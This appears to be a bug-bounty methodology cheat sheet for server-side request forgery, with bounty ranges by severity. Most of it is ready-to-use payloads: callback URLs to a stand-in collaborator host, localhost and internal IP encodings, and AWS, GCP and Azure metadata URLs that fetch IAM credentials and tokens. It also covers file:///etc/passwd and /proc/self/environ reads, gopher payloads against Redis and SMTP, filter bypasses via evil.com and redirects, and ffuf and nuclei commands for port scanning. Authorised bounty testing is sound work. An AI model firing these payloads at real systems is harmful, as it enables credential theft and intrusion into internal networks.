# Methodology: SSRF Hunting

**Difficulty:** Medium | **Avg Bounty:** $1,000-$10,000+ | **Competition:** Medium

## Why SSRF?

Server-Side Request Forgery lets you make the target server fetch URLs on your behalf. Critical because:
- Access internal services (databases, admin panels, metadata APIs)
- Pivot to cloud metadata → steal credentials → full takeover
- Bypass firewalls and IP-based access controls

## Where to Look

Any parameter that accepts a URL or hostname:
```
Webhook URLs (Slack, Discord integrations)
Image/PDF import from URL
URL preview / link unfurling
API proxy endpoints
XML/SOAP with external entity
File import (CSV, XML from URL)
PDF generators (HTML to PDF)
DNS lookup tools
Ping/traceroute utilities
```

## Attack Progression

### Phase 1: Basic Detection
```
# Your Burp Collaborator or webhook.site
https://YOURBURPCOLLABORATOR.net

# Place in every URL parameter:
url=https://YOURBURPCOLLABORATOR.net
callback=https://YOURBURPCOLLABORATOR.net
webhook=https://YOURBURPCOLLABORATOR.net
```

### Phase 2: Internal Network Scanning
```
# Localhost variants
http://127.0.0.1
http://localhost
http://[::1]
http://0.0.0.0
http://0177.0.0.1        (octal)
http://2130706433        (decimal)
http://0x7f000001        (hex)
http://127.0.0.1.nip.io  (DNS rebinding)

# Internal network
http://10.0.0.1
http://172.16.0.1
http://192.168.1.1
http://100.100.100.200    (Alibaba Cloud metadata)
```

### Phase 3: Cloud Metadata (Critical!)
```
# AWS (IMDSv1)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# AWS (IMDSv2 — requires header, usually blocked by SSRF)
# Still try — some apps proxy headers too

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# GCP requires header: Metadata-Flavor: Google

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Azure requires header: Metadata: true

# DigitalOcean
http://169.254.169.254/metadata/v1/
```

### Phase 4: Protocol Smuggling
```
# File read
file:///etc/passwd
file:///proc/self/environ
file:///proc/self/cmdline

# Redis (if on localhost)
gopher://127.0.0.1:6379/_SET%20pwned%20true
dict://127.0.0.1:6379/INFO

# SMTP
gopher://127.0.0.1:25/_EHLO%20attacker

# FastCGI
gopher://127.0.0.1:9000/...
```

## Bypass Techniques

```
# URL parsing confusion
http://evil.com@127.0.0.1
http://127.0.0.1#@evil.com
http://127.0.0.1%23@evil.com
http://evil.com%00@127.0.0.1

# DNS rebinding
http://make-127.0.0.1-rebind-ssrf.your-domain.com
# Register domain, first DNS lookup returns safe IP, second returns 127.0.0.1

# URL shortener bypass
https://bit.ly/shortened → redirects to internal IP

# Redirect bypass
http://your-server.com/redirect?to=http://169.254.169.254
# Some SSRF protections only check the initial URL, not the redirect target

# CIDR bypass
http://127.128.0.0
http://0177.0.0.0
```

## Tools

```bash
# SSRF testing with Burp
# Use Collaborator for blind SSRF detection

# nuclei templates for SSRF
nuclei -t http/vulnerabilities/ -tags ssrf -u https://target.com

# ffuf internal port scan via SSRF parameter
ffuf -u "https://target.com/fetch?url=http://127.0.0.1:FUZZ" -w <(seq 1 65535) -mc 200 -fc 500,502,503
```

## Impact Assessment

| Access Level | Severity | Typical Bounty |
|---|---|---|
| Blind SSRF (OOB only) | Medium | $500-$2,000 |
| Internal port scanning | Medium-High | $1,000-$5,000 |
| Cloud metadata access | Critical | $5,000-$20,000 |
| AWS credential theft | Critical | $10,000-$50,000+ |
| RCE via Redis/FastCGI | Critical | $10,000+ |
